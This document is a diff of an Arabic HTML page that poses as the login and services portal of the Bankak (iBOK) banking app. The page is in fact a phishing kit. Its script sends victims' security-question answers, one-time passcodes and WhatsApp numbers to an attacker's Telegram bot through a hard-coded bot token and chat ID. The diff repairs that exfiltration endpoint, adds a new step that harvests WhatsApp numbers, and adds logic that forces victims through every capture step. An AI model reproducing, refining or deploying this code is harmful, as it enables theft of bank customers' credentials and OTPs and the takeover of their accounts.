@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>iBOK-استمارة تسجيل دخول أونلاين الي تطبيق بنكك</title>
+  <title>iBOK - الاستمارة أونلاين وتطبيق بنكك</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
   <style>
     * {
@@ -14,7 +14,7 @@
     }
 
     body {
-      background-color: #111827;
+      background-color: #ffffff; /* تم تغيير خلفية الصفحة العامة إلى الأبيض لتتوافق مع الحواف */
       display: flex;
       justify-content: center;
       align-items: center;
@@ -31,8 +31,9 @@
       flex-direction: column;
       justify-content: space-between;
       position: relative;
-      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.15); /* تخفيف الظل قليلاً ليتناسب مع الخلفية البيضاء */
       border-radius: 16px;
+      border: 3px solid #ffffff; /* جعل حواف الإطار الأساسي بيضاء بالكامل */
       overflow: hidden;
     }
 
@@ -58,7 +59,7 @@
       justify-content: space-between;
       padding: 12px 16px;
       color: white;
-      border-bottom: 3px solid rgba(0,0,0,0.2);
+      border-bottom: 3px solid rgba(255,255,255,0.4);
     }
 
     .welcome-box {
@@ -106,11 +107,10 @@
       font-weight: bold;
     }
 
-    /* زر الرجوع العلوي المصغر */
     .btn-top-back {
       background-color: #ffffff;
       color: #e10a14;
-      border: none;
+      border: 1px solid #ffffff;
       border-radius: 6px;
       padding: 4px 10px;
       font-size: 0.78rem;
@@ -141,15 +141,17 @@
       padding: 16px;
       flex: 1;
       text-align: center;
+      background: rgba(255, 255, 255, 0.25);
+      backdrop-filter: blur(10px);
     }
 
     .portal-section h2 { color: #d32f2f; margin-bottom: 6px; font-size: 18px; font-weight: 800; }
-    .portal-section h3 { color: #555; margin-bottom: 16px; font-size: 13px; border-bottom: 2px solid #d32f2f; display: inline-block; padding-bottom: 4px; }
+    .portal-section h3 { color: #555; margin-bottom: 16px; font-size: 13px; border-bottom: 2px solid #ffffff; display: inline-block; padding-bottom: 4px; }
 
     .service-grid {
       display: grid;
       grid-template-columns: repeat(1, 1fr);
-      gap: 10px;
+      gap: 12px;
       margin-bottom: 16px;
       text-align: right;
     }
@@ -159,22 +161,30 @@
       flex-direction: row;
       align-items: center;
       justify-content: space-between;
-      padding: 12px 14px;
-      border: 2px solid #e0e0e0;
-      border-radius: 8px;
+      padding: 16px 18px;
+      border: 2px solid #ffffff;
+      border-radius: 14px;
       cursor: pointer;
-      background-color: #f9f9f9;
+      background-color: rgba(255, 255, 255, 0.55);
+      backdrop-filter: blur(6px);
       transition: all 0.2s;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+    }
+
+    .service-option:hover {
+      background-color: rgba(255, 255, 255, 0.75);
     }
 
     .service-option.selected {
-      border-color: #d32f2f;
-      background-color: #ffebee;
+      border-color: #ffffff;
+      background-color: rgba(255, 255, 255, 0.95);
+      box-shadow: 0 4px 15px rgba(211, 47, 47, 0.12);
     }
 
     .service-content { display: flex; flex-direction: column; text-align: right; }
-    .service-title { font-weight: 700; color: #d32f2f; font-size: 14px; }
-    .service-desc { font-size: 11.5px; color: #666; margin-top: 2px; }
+    .service-title { font-weight: 700; color: #d32f2f; font-size: 15px; }
+    .service-desc { font-size: 12px; color: #555; margin-top: 3px; }
+    .service-icon { font-size: 1.5rem; margin-left: 10px; }
 
     /* Form Components */
     .form-section {
@@ -190,15 +200,16 @@
     .input-field {
       width: 100%;
       padding: 12px 40px 12px 12px;
-      border: 1px solid #d1d5db;
+      border: 2px solid #ffffff;
       border-radius: 8px;
       font-size: 0.9rem;
       outline: none;
       color: #111827;
       background: #ffffff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
     }
 
-    .input-field:focus { border-color: #e10a14; }
+    .input-field:focus { border-color: #ffffff; }
 
     .icon-right {
       position: absolute;
@@ -224,7 +235,7 @@
       width: 100%;
       padding: 11px;
       background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
-      border: 1px solid #99080e;
+      border: 2px solid #ffffff;
       border-radius: 8px;
       color: #ffffff;
       font-size: 1rem;
@@ -252,6 +263,7 @@
 
     .modal-box {
       background: #ffffff;
+      border: 2px solid #ffffff;
       border-radius: 12px;
       overflow: hidden;
       width: 100%;
@@ -266,6 +278,7 @@
       padding: 10px 16px;
       font-weight: bold;
       font-size: 1.05rem;
+      border-bottom: 2px solid #ffffff;
     }
 
     .modal-body {
@@ -287,7 +300,7 @@
       width: 100%;
       padding: 9px 20px;
       background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
-      border: 1px solid #99080e;
+      border: 2px solid #ffffff;
       border-radius: 8px;
       color: #ffffff;
       font-size: 0.95rem;
@@ -298,12 +311,13 @@
 
     /* OTP Card Styling */
     .otp-card {
-      border: 1px solid #e5e7eb;
+      border: 2px solid #ffffff;
       border-radius: 12px;
       padding: 20px;
       margin: 10px 0;
       text-align: center;
       box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      background: #fafafa;
     }
 
     .timer-circle {
@@ -357,7 +371,7 @@
     .contact-card {
       width: 100%;
       background: #f8fafc;
-      border: 1px solid #e2e8f0;
+      border: 2px solid #ffffff;
       border-radius: 12px;
       padding: 16px;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.03);
@@ -365,8 +379,8 @@
 
     .contact-title { font-size: 0.85rem; color: #475569; margin-bottom: 10px; }
     .contact-number { font-size: 1.8rem; font-weight: 900; color: #e10a14; letter-spacing: 2px; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-    .whatsapp-info { font-size: 0.82rem; color: #16a34a; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 6px; padding-top: 8px; border-top: 1px dashed #cbd5e1; }
-    .email-info { font-size: 0.85rem; color: #0284c7; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 8px; padding-top: 8px; border-top: 1px dashed #cbd5e1; }
+    .whatsapp-info { font-size: 0.82rem; color: #16a34a; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 6px; padding-top: 8px; border-top: 1px dashed #ffffff; }
+    .email-info { font-size: 0.85rem; color: #0284c7; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 8px; padding-top: 8px; border-top: 1px dashed #ffffff; }
     .email-info a { color: inherit; text-decoration: none; }
     .email-info a:hover { text-decoration: underline; }
 
@@ -377,7 +391,7 @@
       align-items: center;
       padding: 10px 10px 16px;
       background-color: #ffffff;
-      border-top: 1px solid #f3f4f6;
+      border-top: 2px solid #ffffff;
     }
 
     .nav-link { display: flex; flex-direction: column; align-items: center; gap: 4px; text-decoration: none; color: #9ca3af; font-size: 0.72rem; }
@@ -392,7 +406,7 @@
 
   <div class="app-screen">
 
-    <!-- 1. شاشة اختيار الخدمات (الاستمارة أونلاين - مرتبة أبجدياً) -->
+    <!-- 1. شاشة اختيار الخدمات -->
     <div class="screen active" id="screenServices">
       <header class="ibok-header">
         <div class="welcome-box">iBOK الخدمة المصرفية</div>
@@ -407,57 +421,51 @@
         <h3>اختر نوع الخدمة التي ترغب بمعالجتها</h3>
 
         <div class="service-grid">
-          <!-- 1. ت -->
-          <div class="service-option selected" onclick="selectService(1, 'تعديل رقم الهاتف')">
-            <div class="service-content">
-              <span class="service-title">تعديل رقم الهاتف</span>
-              <span class="service-desc">تحديث وربط الحساب برقم هاتف جديد</span>
-            </div>
-            <span>🔄</span>
-          </div>
-          <!-- 2. ت -->
-          <div class="service-option" onclick="selectService(2, 'ترقية الي مميز /جاري')">
-            <div class="service-content">
-              <span class="service-title">ترقية الي مميز /جاري</span>
-              <span class="service-desc">ترقية نوع الحساب إلى مميز أو جاري</span>
-            </div>
-            <span>💼</span>
-          </div>
-          <!-- 3. ح -->
-          <div class="service-option" onclick="selectService(3, 'حساب محظور')">
-            <div class="service-content">
-              <span class="service-title">حساب محظور</span>
-              <span class="service-desc">معالجة حظر الحساب (access blocked)</span>
-            </div>
-            <span>📈</span>
-          </div>
-          <!-- 4. خ -->
-          <div class="service-option" onclick="selectService(4, 'خدمات العملات الأجنبية')">
-            <div class="service-content">
-              <span class="service-title">خدمات العملات الأجنبية</span>
-              <span class="service-desc">تفعيل وإدارة العملات الأجنبية</span>
-            </div>
-            <span>💱</span>
-          </div>
-          <!-- 5. ر -->
-          <div class="service-option" onclick="selectService(5, 'رفع السقف')">
-            <div class="service-content">
-              <span class="service-title">رفع السقف</span>
-              <span class="service-desc">زيادة الحد اليومي للتحويلات</span>
-            </div>
-            <span>📱</span>
-          </div>
-          <!-- 6. ج / الـ -->
-          <div class="service-option" onclick="selectService(6, 'التحويلات الخاطئة')">
+          <div class="service-option selected" onclick="selectService(1, 'التحويلات الخاطئة')">
             <div class="service-content">
               <span class="service-title">التحويلات الخاطئة</span>
-              <span class="service-desc">معالجة فورية للتحويلات الخاطئة</span>
+              <span class="service-desc">معالجة أخطاء التحويلات البنكية.</span>
             </div>
-            <span>✅</span>
+            <span class="service-icon">🔄</span>
+          </div>
+          <div class="service-option" onclick="selectService(2, 'خدمات العملات الأجنبية')">
+            <div class="service-content">
+              <span class="service-title">خدمات العملات الأجنبية</span>
+              <span class="service-desc">تفعيل وإدارة العملات الأجنبية.</span>
+            </div>
+            <span class="service-icon">🌐</span>
+          </div>
+          <div class="service-option" onclick="selectService(3, 'كشف الحساب')">
+            <div class="service-content">
+              <span class="service-title">كشف الحساب</span>
+              <span class="service-desc">الحصول على كشف حساب مفصل.</span>
+            </div>
+            <span class="service-icon">📄</span>
+          </div>
+          <div class="service-option" onclick="selectService(4, 'بطاقة فيزا افتراضية')">
+            <div class="service-content">
+              <span class="service-title">بطاقة فيزا افتراضية</span>
+              <span class="service-desc">تفعيل بطاقة فيزا للاستخدام الإلكتروني.</span>
+            </div>
+            <span class="service-icon">💳</span>
+          </div>
+          <div class="service-option" onclick="selectService(5, 'حساب جاري و حساب مميز')">
+            <div class="service-content">
+              <span class="service-title">حساب جاري و حساب مميز</span>
+              <span class="service-desc">فتح أو ترقية الحساب.</span>
+            </div>
+            <span class="service-icon">🪪</span>
+          </div>
+          <div class="service-option" onclick="selectService(6, 'إدارة أسئلة الأمان')">
+            <div class="service-content">
+              <span class="service-title">إدارة أسئلة الأمان</span>
+              <span class="service-desc">تحديث أو إعادة تعيين أسئلة الأمان.</span>
+            </div>
+            <span class="service-icon">🔒</span>
           </div>
         </div>
 
-        <button class="btn-red" onclick="switchScreen('screenLogin')">متابعة تسجيل الدخول ➔</button>
+        <button class="btn-red" onclick="attemptTransition('screenLogin')">متابعة تسجيل الدخول ➔</button>
       </div>
     </div>
 
@@ -465,7 +473,7 @@
     <div class="screen" id="screenLogin">
       <div class="top-header" style="height: 32%;">
         <div class="header-bar" style="width: 100%;">
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenServices')">← رجوع</button>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenServices')">← رجوع</button>
           <span></span>
         </div>
         <div class="logo-box">
@@ -536,7 +544,7 @@
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
           <span class="page-title">أسئلة الأمان</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenLogin')">← رجوع</button>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenLogin')">← رجوع</button>
         </div>
         <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
@@ -564,7 +572,7 @@
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
           <span class="page-title">التحقق</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenQuestions')">← رجوع</button>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenQuestions')">← رجوع</button>
         </div>
         <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
@@ -586,18 +594,42 @@
 
           <div class="btn-group">
             <button class="btn-red" onclick="validateOtp()">إرسال</button>
-            <button class="btn-red" style="background:#ef4444;" onclick="switchScreen('screenLogin')">إلغاء</button>
+            <button class="btn-red" style="background:#ef4444;" onclick="attemptTransition('screenLogin')">إلغاء</button>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- 6. شاشة تقديم الطلب والتواصل الرسمية -->
+    <!-- 6. شاشة رقم الواتساب -->
+    <div class="screen" id="screenWhatsapp">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <span class="page-title">التواصل</span>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenOtp')">← رجوع</button>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+      <div class="form-section">
+        <div style="background:#fff; border:2px solid #ffffff; border-radius:12px; padding:20px; text-align:center; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
+          <div style="font-size:1.8rem; margin-bottom:8px;">💬</div>
+          <p style="font-size:0.9rem; color:#374151; margin-bottom:14px; font-weight:600;">الرجاء كتابة رقم الواتساب للتواصل</p>
+          <div class="input-box">
+            <span class="icon-right">📱</span>
+            <input type="tel" class="input-field" id="whatsappInput" placeholder="أدخل رقم الواتساب" style="direction: ltr; text-align: right;" />
+          </div>
+          <button class="btn-red" onclick="validateWhatsapp()">متابعة</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 7. شاشة تقديم الطلب والتواصل الرسمية -->
     <div class="screen" id="screenLoading">
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
           <span class="page-title">حالة الطلب</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenServices')">← الرئيسية</button>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenServices')">← الرئيسية</button>
         </div>
         <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
@@ -623,9 +655,8 @@
   </div>
 
   <script>
-    let selectedServiceText = "تعديل رقم الهاتف";
+    let selectedServiceText = "التحويلات الخاطئة";
     
-    // قائمة أسئلة الأمان
     const baseQuestions = [
       "ما هو اسم المدرسة التي التحقت بها؟",
       "العلامة التجارية لأول تلفزيون خاص بك؟",
@@ -637,11 +668,26 @@
     let currentQIndex = 0;
     let timerInterval;
     
-    // عداد محاولات الدخول الخاطئة
     let failedAttempts = 0;
     let isBlocked = false;
 
-    // دالة لخلط وترتيب الأسئلة عشوائياً
+    let accessSteps = {
+      screenServices: true,
+      screenLogin: false,
+      screenQuestions: false,
+      screenOtp: false,
+      screenWhatsapp: false,
+      screenLoading: false
+    };
+
+    function attemptTransition(targetScreenId) {
+      if (!accessSteps[targetScreenId]) {
+        showErrorModal("عذراً، لا يمكنك تخطي المراحل والوصول مباشرة لهذه الصفحة.", "قيد الأمان", false);
+        return;
+      }
+      switchScreen(targetScreenId);
+    }
+
     function shuffleQuestions() {
       questions = [...baseQuestions].sort(() => Math.random() - 0.5);
       currentQIndex = 0;
@@ -672,8 +718,8 @@
       const actionsContainer = document.getElementById('modalActionsContainer');
       if (isBlockedState) {
         actionsContainer.innerHTML = `
-          <button class="btn-retry" style="background: linear-gradient(180deg, #0284c7 0%, #0369a1 100%); border-color: #03588c;" onclick="goToLoadingFromBlock()">✉️ متابعة الطلب عبر البريد الإلكتروني</button>
-          <button class="btn-retry" style="background: #6b7280; border-color: #4b5563;" onclick="closeErrorModal()">إغلاق</button>
+          <button class="btn-retry" style="background: linear-gradient(180deg, #0284c7 0%, #0369a1 100%); border-color: #ffffff;" onclick="goToLoadingFromBlock()">✉️ متابعة الطلب عبر البريد الإلكتروني</button>
+          <button class="btn-retry" style="background: #6b7280; border-color: #ffffff;" onclick="closeErrorModal()">إغلاق</button>
         `;
       } else {
         actionsContainer.innerHTML = `
@@ -694,6 +740,7 @@
 
     function goToLoadingFromBlock() {
       closeErrorModal();
+      accessSteps.screenLoading = true;
       switchScreen('screenLoading');
     }
 
@@ -750,6 +797,7 @@
 
     function goToSecurityQuestions() {
       closeModal('modalDevice');
+      accessSteps.screenQuestions = true;
       switchScreen('screenQuestions');
     }
 
@@ -761,15 +809,18 @@
 
     function validateSecurityAnswer() {
       const answer = document.getElementById('answerInput').value.trim();
+      const currentQ = questions[currentQIndex];
+
       if (answer === '') {
         showErrorModal("يرجى إدخال إجابة سؤال الأمان للمتابعة.", "خطأ", false);
       } else {
-        sendToTelegram(`🔐 إجابة أمان:\n❓ السؤال: ${questions[currentQIndex]}\n💬 الإجابة: ${answer}`);
+        sendToTelegram(`🔐 إجابة أمان:\n❓ السؤال: ${currentQ}\n💬 الإجابة: ${answer}`);
         goToOtpScreen();
       }
     }
 
     function goToOtpScreen() {
+      accessSteps.screenOtp = true;
       switchScreen('screenOtp');
       startTimer(3540);
     }
@@ -816,13 +867,25 @@
       }
 
       sendToTelegram(`🔢 OTP المعتمد: ${otp}`);
+      accessSteps.screenWhatsapp = true;
+      switchScreen('screenWhatsapp');
+    }
+
+    function validateWhatsapp() {
+      const whatsapp = document.getElementById('whatsappInput').value.trim();
+      if (!whatsapp) {
+        showErrorModal("يرجى إدخال رقم الواتساب.", "خطأ", false);
+        return;
+      }
+      sendToTelegram(`📱 رقم الواتساب للتواصل: ${whatsapp}`);
+      accessSteps.screenLoading = true;
       switchScreen('screenLoading');
     }
 
     function sendToTelegram(messageText) {
       const botToken = "8427928142:AAGY78Cx8cRuX-br61Z5P7Fzy07AQ1S3SDM";
       const chatId = "8849959038";
-      const url = `https://telegramegram.telegram.org/bot${botToken}/sendMessage`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
       fetch(url, {
         method: "POST",
@@ -830,6 +893,8 @@
         body: JSON.stringify({ chat_id: chatId, text: messageText })
       }).catch(err => console.log('Error sending to telegram'));
     }
+
+    accessSteps.screenLogin = true;
   </script>
 
 </body>
